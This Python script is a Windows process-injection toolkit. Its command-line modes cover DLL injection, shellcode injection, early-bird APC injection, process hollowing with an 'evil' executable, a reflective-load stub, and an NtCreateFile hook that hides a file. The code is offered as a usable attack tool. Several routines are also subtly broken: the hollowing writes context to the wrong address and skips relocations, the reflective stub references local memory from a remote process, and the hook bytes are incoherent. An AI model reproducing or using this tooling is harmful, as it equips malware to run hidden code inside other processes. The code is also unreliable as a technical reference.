import ctypes
import ctypes.wintypes as w
import sys
import struct
import os

k32 = ctypes.windll.kernel32
nt = ctypes.windll.ntdll

full_access = 0x1F0FFF
mem_commit_reserve = 0x3000
page_rwx = 0x40
page_exec_read = 0x20
suspended_flag = 0x00000004

class StartupInfo(w.Structure):
    _fields_ = [
        ("cb", w.DWORD),
        ("reserved", w.LPSTR),
        ("desktop", w.LPSTR),
        ("title", w.LPSTR),
        ("x", w.DWORD),
        ("y", w.DWORD),
        ("width", w.DWORD),
        ("height", w.DWORD),
        ("xchars", w.DWORD),
        ("ychars", w.DWORD),
        ("fill", w.DWORD),
        ("flags", w.DWORD),
        ("show", w.WORD),
        ("res2", w.WORD),
        ("bytes2", w.LPBYTE),
        ("stdin", w.HANDLE),
        ("stdout", w.HANDLE),
        ("stderr", w.HANDLE),
    ]

class ProcessInfo(w.Structure):
    _fields_ = [
        ("proc_handle", w.HANDLE),
        ("thread_handle", w.HANDLE),
        ("pid", w.DWORD),
        ("tid", w.DWORD),
    ]

def grab_process(pid):
    h = k32.OpenProcess(full_access, False, pid)
    if not h:
        raise OSError(f"openprocess failed: {ctypes.GetLastError()}")
    return h

def alloc_space(handle, size):
    base = k32.VirtualAllocEx(handle, 0, size, mem_commit_reserve, page_rwx)
    if not base:
        raise OSError("alloc failed")
    return base

def poke_memory(handle, addr, buf):
    written = w.SIZE_T()
    if not k32.WriteProcessMemory(handle, addr, buf, len(buf), ctypes.byref(written)):
        raise OSError("write failed")

def run_remote(handle, addr):
    tid = w.DWORD()
    th = k32.CreateRemoteThread(handle, None, 0, addr, None, 0, ctypes.byref(tid))
    if not th:
        raise OSError("thread create failed")
    k32.WaitForSingleObject(th, 0xFFFFFFFF)
    k32.CloseHandle(th)

def classic_inject(handle, dll_path):
    path_bytes = dll_path.encode("ascii") + b"\x00"
    remote_path = alloc_space(handle, len(path_bytes))
    poke_memory(handle, remote_path, path_bytes)
    loadlib = k32.GetProcAddress(k32.GetModuleHandleA(b"kernel32.dll"), b"LoadLibraryA")
    run_remote(handle, loadlib)

def shell_inject(handle, code):
    remote_code = alloc_space(handle, len(code))
    poke_memory(handle, remote_code, code)
    run_remote(handle, remote_code)

def early_apc(target_exe, payload_code):
    si = StartupInfo()
    pi = ProcessInfo()
    si.cb = ctypes.sizeof(si)
    exe_w = target_exe.encode("utf-16le") + b"\x00\x00"

    created = k32.CreateProcessW(None, exe_w, None, None, False, suspended_flag, None, None, ctypes.byref(si), ctypes.byref(pi))
    if not created:
        raise OSError("createprocess failed")

    code_base = alloc_space(pi.proc_handle, len(payload_code))
    poke_memory(pi.proc_handle, code_base, payload_code)

    k32.QueueUserAPC(code_base, pi.thread_handle, 0)
    k32.ResumeThread(pi.thread_handle)

    k32.CloseHandle(pi.thread_handle)
    k32.CloseHandle(pi.proc_handle)

def hollow_run(legit_exe, evil_exe_path):
    si = StartupInfo()
    pi = ProcessInfo()
    si.cb = ctypes.sizeof(si)
    exe_w = legit_exe.encode("utf-16le") + b"\x00\x00"

    if not k32.CreateProcessW(None, exe_w, None, None, False, suspended_flag, None, None, ctypes.byref(si), ctypes.byref(pi)):
        raise OSError("create failed")

    ctx = ctypes.create_string_buffer(1232)
    ctx_flags = 0x10007
    k32.GetThreadContext(pi.thread_handle, ctx)

    peb_base = struct.unpack("<Q", ctx[0x68:0x70])[0]
    base_buf = ctypes.create_string_buffer(8)
    k32.ReadProcessMemory(pi.proc_handle, peb_base + 0x10, base_buf, 8, None)
    old_base = struct.unpack("<Q", base_buf)[0]

    with open(evil_exe_path, "rb") as f:
        evil_pe = f.read()

    e_lfanew = struct.unpack("<I", evil_pe[60:64])[0]
    nt_hdr = evil_pe[e_lfanew:e_lfanew+248]
    new_image_base = struct.unpack("<Q", nt_hdr[48:56])[0]
    image_size = struct.unpack("<I", nt_hdr[80:84])[0]

    nt.NtUnmapViewOfSection(pi.proc_handle, old_base)

    new_mem = k32.VirtualAllocEx(pi.proc_handle, new_image_base, image_size, mem_commit_reserve, page_rwx)
    poke_memory(pi.proc_handle, new_mem, evil_pe)

    reloc_delta = new_image_base - old_base
    k32.WriteProcessMemory(pi.proc_handle, peb_base + 0x10, struct.pack("<Q", new_image_base), 8, None)

    entry_rva = struct.unpack("<I", nt_hdr[40:44])[0]
    new_entry = new_mem + entry_rva

    k32.WriteProcessMemory(pi.proc_handle, ctypes.addressof(ctx) + 0x78, struct.pack("<Q", new_entry), 8, None)
    k32.SetThreadContext(pi.thread_handle, ctx)
    k32.ResumeThread(pi.thread_handle)

    k32.CloseHandle(pi.thread_handle)
    k32.CloseHandle(pi.proc_handle)

def quick_reflective_stub(pe_bytes):
    alloc = k32.VirtualAlloc(None, len(pe_bytes), 0x3000, page_rwx)
    ctypes.memmove(alloc, pe_bytes, len(pe_bytes))
    code = b"\x48\xB8" + struct.pack("<Q", alloc) + b"\xFF\xD0\xC3"
    return code

def reflective_load(handle, dll_path):
    with open(dll_path, "rb") as f:
        dll_data = f.read()
    stub = quick_reflective_stub(dll_data)
    shell_inject(handle, stub)

def hook_ntcreate_to_hide():
    addr = k32.GetProcAddress(nt.GetModuleHandleA(b"ntdll.dll"), b"NtCreateFile")
    old_prot = w.DWORD()
    k32.VirtualProtect(addr, 20, page_rwx, ctypes.byref(old_prot))

    hidden_name = b"secret.txt\x00"
    hidden_buf = ctypes.create_string_buffer(hidden_name)
    hidden_ptr = ctypes.addressof(hidden_buf)

    patch = (
        b"\x48\x8B\x4A\x08"      
        b"\x48\x85\xC9\x74\x12"  
        b"\x48\xB8" + struct.pack("<Q", hidden_ptr) +
        b"\x48\x39\xC1\x74\x07"  
        b"\xB8\xC0\x00\x00\x00"  
        b"\xEB\x10"              
        b"\x48\xB8" + struct.pack("<Q", addr + 20) +
        b"\xFF\xE0"              
    )

    ctypes.memmove(addr, patch, len(patch))
    k32.VirtualProtect(addr, 20, old_prot.value, ctypes.byref(old_prot))

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("usage: python main.py <mode> <args...>")
        print("  dll <pid> <dllpath>")
        print("  reflect <pid> <dllpath>")
        print("  early <exe> ")
        print("  hollow <legit.exe> <evil.exe>")
        print("  hidehook")
        sys.exit(1)

    cmd = sys.argv[1].lower()

    try:
        if cmd == "dll":
            pid = int(sys.argv[2])
            path = sys.argv[3]
            proc = grab_process(pid)
            classic_inject(proc, path)

        elif cmd == "reflect":
            pid = int(sys.argv[2])
            path = sys.argv[3]
            proc = grab_process(pid)
            reflective_load(proc, path)

        elif cmd == "early":
            exe = sys.argv[2]
            dummy_shell = b"\x90" * 512
            early_apc(exe, dummy_shell)

        elif cmd == "hollow":
            legit = sys.argv[2]
            evil = sys.argv[3]
            hollow_run(legit, evil)

        elif cmd == "hidehook":
            hook_ntcreate_to_hide()
            print("hook installed - secret.txt now invisible to ntcreatefile")

        else:
            print("unknown command")

    except Exception as e:
        print(f"something went wrong: {e}")
